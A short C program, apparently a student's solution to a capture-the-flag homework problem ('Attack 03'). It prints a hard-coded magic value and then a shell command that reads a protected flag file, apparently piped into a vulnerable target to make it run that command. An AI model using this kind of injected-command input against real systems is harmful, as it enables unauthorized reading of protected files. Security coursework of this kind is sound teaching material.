/* 
 * Attack 03 - Fill out this program to implement your attack for Problem 3
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  char magic [] = "1227432308";
  char command [] = "more /home/flags/hw02/flag03.txt";
  puts(magic);
  fflush(stdout);
  sleep(1);
  puts(command);

  return 0;
}
